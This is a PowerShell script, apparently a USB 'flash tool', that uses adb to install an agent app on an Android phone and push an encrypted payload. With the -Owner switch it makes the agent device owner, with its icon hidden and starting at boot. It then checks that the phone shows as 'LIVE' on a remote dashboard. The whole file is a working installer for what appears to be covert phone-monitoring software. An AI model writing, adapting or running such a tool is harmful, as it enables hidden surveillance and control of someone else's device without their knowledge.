<#
NOVA USB flash tool (PowerShell). Same job as flash.bat with clearer
errors. Run from the flash drive:  .\flash.ps1 -Payload payloads\device.nova -Owner
#>
param(
    [Parameter(Mandatory = $false)]
    [string]$Payload = "payloads\device.nova",
    [switch]$Owner
)
Set-Location (Split-Path -Parent $MyInvocation.MyCommand.Definition)
$ErrorActionPreference = "Stop"

function Fail($msg) { Write-Host "[NOVA] failed: $msg" -ForegroundColor Red; exit 1 }

if (-not (Test-Path $Payload)) { Fail "payload not found: $Payload (put a .nova in payloads\)" }

$adb = if (Test-Path "platform-tools\adb.exe") { "platform-tools\adb.exe" } else { "adb" }
if (-not (Get-Command $adb -ErrorAction SilentlyContinue)) { Fail "adb missing on the stick" }

Write-Host "[NOVA] waiting for a phone (USB debugging enabled)..." -ForegroundColor Cyan
& $adb wait-for-device | Out-Null
Write-Host "[NOVA] device detected."

$agent = "com.novara.agent"
$installed = (& $adb shell pm path $agent 2>$null) -match "package:"
if (-not $installed) {
    if (-not (Test-Path "bootstrap\bootstrap-agent.apk")) {
        Fail "agent not installed; drop bootstrap\bootstrap-agent.apk on the stick"
    }
    Write-Host "[NOVA] installing bootstrap agent once..."
    & $adb install -r -t "bootstrap\bootstrap-agent.apk"
    if ($LASTEXITCODE -ne 0) { Fail "apk install" }
}

Write-Host "[NOVA] pushing encrypted payload..."
& $adb push $Payload /sdcard/Download/nova-payload.nova | Out-Null
if ($LASTEXITCODE -ne 0) { Fail "adb push" }

Write-Host "[NOVA] telling the agent to verify + unlock + attach..."
& $adb shell am start -n "$agent/.ImportActivity" --es file /sdcard/Download/nova-payload.nova | Out-Null

if ($Owner) {
    Write-Host "[NOVA] provisioning hidden device-owner mode..."
    & $adb shell dpm set-device-owner "$agent/.bootstrap.DeviceOwnerAdmin" | Out-Null
    if ($LASTEXITCODE -ne 0) {
        Write-Host "[NOVA] owner needs a fresh device with no accounts set up." -ForegroundColor Yellow
    } else {
        Write-Host "[NOVA] device owner granted: icon hidden, boots with phone." -ForegroundColor Green
    }
}

Write-Host "[NOVA] done. Verify the phone appears LIVE on the NOVA dashboard." -ForegroundColor Green
exit 0